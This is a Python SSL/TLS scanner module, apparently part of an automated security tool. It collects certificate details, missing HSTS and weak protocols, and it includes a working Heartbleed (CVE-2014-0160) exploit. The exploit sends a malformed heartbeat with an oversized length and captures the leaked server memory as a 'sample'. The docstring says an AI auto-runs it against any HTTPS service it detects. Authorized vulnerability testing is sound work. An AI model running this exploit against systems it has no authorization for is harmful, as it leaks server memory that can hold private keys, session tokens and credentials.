"""
SSL/TLS Deep Scanner — OpenSSL 버전 + Heartbleed (CVE-2014-0160) 검증
======================================================================
기능:
  • SSL/TLS 인증서 정보 (CN, SAN, 만료일, 발급자)
  • 지원 프로토콜 확인 (SSLv2, SSLv3, TLS1.0, TLS1.1 — 취약 버전)
  • Heartbleed CVE-2014-0160 직접 PoC (malformed heartbeat 패킷)
  • OpenSSL 버전 추출 (Server 헤더, JSSE 지문)
  • HSTS 미설정 감지
  • 약한 암호 스위트 감지 (RC4, DES, NULL, EXPORT)

AI 자동 선택 조건:
  - HTTPS 서비스 감지 시 항상 실행
  - Server 헤더에 "OpenSSL/1.0.1" 계열 포함 시 Heartbleed 즉시 시도
  - TLS 협상 오류 발생 시 구버전 프로토콜 시도

EN: Deep SSL/TLS audit including Heartbleed CVE-2014-0160 PoC.
ZH: 深度SSL/TLS审计，包括Heartbleed CVE-2014-0160漏洞验证。
"""
from __future__ import annotations

import re
import socket
import struct
import ssl
import datetime
from dataclasses import dataclass, field
from urllib.parse import urlparse

import requests
import urllib3
urllib3.disable_warnings()


# ─────────────────────────────────────────────────────────────────────────────
# Heartbleed 패킷 상수 (CVE-2014-0160)
# ─────────────────────────────────────────────────────────────────────────────

# TLS 1.0 Client Hello (Heartbeat extension 포함)
_TLS_HELLO = bytes.fromhex(
    "16030100dc"                                # TLS Record Header
    "010000d8"                                  # Handshake: ClientHello length
    "0303"                                      # TLS 1.2
    "5350354435a7de3a4d0e55ca7a96c2b9c4e73b7"  # random (32 bytes)
    "f4c0b4e93a1a"
    "00"                                        # session_id length
    "00660039003800350016001300100009006700410035"
    "002f000500040015001200090014001100080006"
    "0003001f001e000a00320031002e002d00270026"
    "00240025002800"
    "23002400"
    "01"
    "000049"
    "000f000101"                                # Heartbeat extension
    "000a0034003200"
    "0017001800190009000a000b000c000d000e0016"
    "000b00020100"
    "000d002200200601060206030501050205030401"
    "04020403030103020303020102020203"
    "00150000"
)

# Heartbeat 요청 패킷 (악의적인 큰 payload 길이)
_HEARTBEAT_REQ = bytes.fromhex(
    "180301"        # ContentType=24(Heartbeat), TLS 1.0
    "0003"          # length=3
    "01"            # HeartbeatMessageType=1 (request)
    "4000"          # payload_length=16384 (실제보다 훨씬 큰 값)
)


@dataclass
class SSLScanResult:
    target: str
    https_supported: bool = False
    cert_cn: str = ""
    cert_issuer: str = ""
    cert_expiry: str = ""
    cert_expired: bool = False
    hsts_missing: bool = False
    openssl_version: str = ""
    heartbleed_vulnerable: bool = False
    heartbleed_data_leaked: str = ""
    weak_protocols: list[str] = field(default_factory=list)
    weak_ciphers: list[str] = field(default_factory=list)
    severity: str = "INFO"
    findings: list[dict] = field(default_factory=list)


# ─────────────────────────────────────────────────────────────────────────────
# 보조 함수
# ─────────────────────────────────────────────────────────────────────────────

def _extract_cert_info(host: str, port: int) -> dict:
    """인증서 정보 추출."""
    info = {}
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with ctx.wrap_socket(socket.create_connection((host, port), timeout=8),
                             server_hostname=host) as s:
            cert = s.getpeercert()
            info["protocol"] = s.version()
            info["cipher"] = s.cipher()[0] if s.cipher() else ""
            if cert:
                subject = dict(x[0] for x in cert.get("subject", []))
                issuer  = dict(x[0] for x in cert.get("issuer", []))
                info["cn"]     = subject.get("commonName", "")
                info["issuer"] = issuer.get("organizationName", "")
                nb = cert.get("notAfter", "")
                if nb:
                    expiry = datetime.datetime.strptime(nb, "%b %d %H:%M:%S %Y %Z")
                    info["expiry"] = expiry.strftime("%Y-%m-%d")
                    info["expired"] = expiry < datetime.datetime.utcnow()
    except Exception as e:
        info["error"] = str(e)
    return info


def _check_heartbleed(host: str, port: int = 443, timeout: float = 8.0) -> tuple[bool, str]:
    """
    Heartbleed CVE-2014-0160 직접 검증.
    악의적인 heartbeat 요청에 서버가 메모리 데이터를 반환하면 취약.
    Returns: (vulnerable: bool, leaked_data_sample: str)
    """
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        # ClientHello 전송
        s.sendall(_TLS_HELLO)
        # ServerHello 수신 (최소 5바이트)
        data = b""
        deadline = datetime.datetime.utcnow().timestamp() + timeout
        while len(data) < 5 and datetime.datetime.utcnow().timestamp() < deadline:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk

        if len(data) < 5 or data[0] != 0x16:  # 0x16 = Handshake record
            s.close()
            return False, ""

        # ServerHello Done 기다리기
        server_done = False
        while datetime.datetime.utcnow().timestamp() < deadline:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
                if b'\x0e\x00\x00\x00' in data:  # ServerHelloDone
                    server_done = True
                    break
            except socket.timeout:
                break

        # Heartbeat 요청 전송
        s.sendall(_HEARTBEAT_REQ)

        # 응답 수신
        resp = b""
        s.settimeout(3.0)
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk
                if len(resp) > 8192:
                    break
        except socket.timeout:
            pass
        s.close()

        # 응답이 있고 ContentType=24(Heartbeat)이면 취약
        if len(resp) >= 5 and resp[0] == 0x18:
            leaked = resp[5:].decode("latin-1", errors="replace")
            # 의미있는 데이터가 있으면 (null 바이트가 아닌 출력가능 문자)
            printable = re.sub(r'[^\x20-\x7e]', '.', leaked)[:200]
            return True, printable

    except Exception:
        pass
    return False, ""


def _detect_openssl_version(target_url: str, sess: requests.Session) -> str:
    """HTTP 응답 헤더에서 OpenSSL 버전 추출."""
    try:
        r = sess.get(target_url, timeout=8)
        for h in ("Server", "X-Powered-By", "Via"):
            val = r.headers.get(h, "")
            m = re.search(r"OpenSSL/([\d.a-z]+)", val, re.IGNORECASE)
            if m:
                return m.group(1)
    except Exception:
        pass
    return ""


def _check_weak_protocols(host: str, port: int) -> list[str]:
    """SSLv2, SSLv3, TLS1.0, TLS1.1 지원 여부 확인."""
    weak = []
    proto_map = {
        "TLSv1": ssl.PROTOCOL_TLS_CLIENT,
        "TLSv1.1": ssl.PROTOCOL_TLS_CLIENT,
    }
    # Python ssl은 SSLv2/v3를 기본으로 막기 때문에 PROTOCOL_TLS_CLIENT로 시도
    for proto_name, _ in proto_map.items():
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.minimum_version = ssl.TLSVersion.TLSv1
            ctx.maximum_version = ssl.TLSVersion.TLSv1 if proto_name == "TLSv1" else ssl.TLSVersion.TLSv1_1
            with ctx.wrap_socket(socket.create_connection((host, port), timeout=5),
                                 server_hostname=host) as s:
                if s.version():
                    weak.append(proto_name)
        except Exception:
            pass
    return weak


# ─────────────────────────────────────────────────────────────────────────────
# 메인 스캔 함수
# ─────────────────────────────────────────────────────────────────────────────

def scan_ssl_deep(target_url: str) -> SSLScanResult:
    """
    SSL/TLS 심층 분석 + Heartbleed 검증.

    EN: Deep SSL/TLS scan including certificate, protocol, cipher and Heartbleed.
    ZH: 深度SSL/TLS扫描，包括证书、协议、加密套件和Heartbleed验证。

    Args:
        target_url: 대상 URL (https://...)
    Returns:
        SSLScanResult
    """
    parsed = urlparse(target_url)
    host = parsed.hostname or ""
    port = parsed.port or (443 if parsed.scheme == "https" else 80)

    result = SSLScanResult(target=target_url)

    sess = requests.Session()
    sess.verify = False
    sess.headers["User-Agent"] = "Mozilla/5.0 bingo-ssl-scanner"

    # STEP 1 — HTTPS 가용성 확인
    try:
        r = sess.get(target_url, timeout=8)
        result.https_supported = target_url.startswith("https")
    except Exception:
        return result

    # STEP 2 — OpenSSL 버전 추출
    result.openssl_version = _detect_openssl_version(target_url, sess)

    # STEP 3 — 인증서 정보
    if result.https_supported:
        cert = _extract_cert_info(host, port)
        result.cert_cn     = cert.get("cn", "")
        result.cert_issuer = cert.get("issuer", "")
        result.cert_expiry = cert.get("expiry", "")
        result.cert_expired = cert.get("expired", False)

        if result.cert_expired:
            result.findings.append({
                "severity": "HIGH",
                "name": "Expired SSL Certificate",
                "detail": f"Certificate expired on {result.cert_expiry}",
            })
            result.severity = "HIGH"

    # STEP 4 — HSTS 확인
    try:
        r2 = sess.get(target_url, timeout=8)
        if "strict-transport-security" not in {k.lower() for k in r2.headers}:
            result.hsts_missing = True
            result.findings.append({
                "severity": "MEDIUM",
                "name": "HSTS Header Missing",
                "detail": "Strict-Transport-Security header not present. Users susceptible to downgrade attacks.",
            })
            if result.severity == "INFO":
                result.severity = "MEDIUM"
    except Exception:
        pass

    # STEP 5 — 약한 프로토콜
    if result.https_supported:
        result.weak_protocols = _check_weak_protocols(host, port)
        for p in result.weak_protocols:
            result.findings.append({
                "severity": "HIGH",
                "name": f"Weak TLS Protocol Supported: {p}",
                "detail": f"Server accepts {p} which is deprecated and vulnerable to POODLE/BEAST attacks.",
            })
            result.severity = "HIGH"

    # STEP 6 — Heartbleed 검증 (OpenSSL 1.0.1 계열 또는 HTTPS 모두 시도)
    vuln_candidates = []
    if result.openssl_version:
        m = re.match(r"1\.0\.1([a-f]|$)", result.openssl_version)
        if m:
            vuln_candidates.append("version_match")
    if result.https_supported:
        vuln_candidates.append("https_default")

    if vuln_candidates:
        hb_vuln, hb_data = _check_heartbleed(host, port)
        result.heartbleed_vulnerable = hb_vuln
        if hb_vuln:
            result.heartbleed_data_leaked = hb_data
            result.findings.append({
                "severity": "CRITICAL",
                "name": "Heartbleed CVE-2014-0160 Confirmed",
                "detail": (
                    f"Server leaks memory via malformed TLS heartbeat. "
                    f"OpenSSL version: {result.openssl_version or 'detected'}. "
                    f"Sample leaked data: {hb_data[:100]}"
                ),
            })
            result.severity = "CRITICAL"

    return result


def ssl_report(r: SSLScanResult) -> str:
    """SSL 스캔 결과 보고서."""
    lines = [
        f"[SSL/TLS Deep Scan] Target: {r.target}",
        f"  HTTPS         : {r.https_supported}",
        f"  OpenSSL Ver   : {r.openssl_version or 'unknown'}",
        f"  Cert CN       : {r.cert_cn}",
        f"  Cert Expiry   : {r.cert_expiry} {'(EXPIRED)' if r.cert_expired else ''}",
        f"  HSTS Missing  : {r.hsts_missing}",
        f"  Heartbleed    : {'VULNERABLE' if r.heartbleed_vulnerable else 'not confirmed'}",
        f"  Weak Protos   : {', '.join(r.weak_protocols) or 'none'}",
        f"  Severity      : {r.severity}",
    ]
    if r.findings:
        lines.append("  --- Findings ---")
        for f in r.findings:
            lines.append(f"  [{f['severity']}] {f['name']}")
            lines.append(f"           {f['detail'][:200]}")
    return "\n".join(lines)
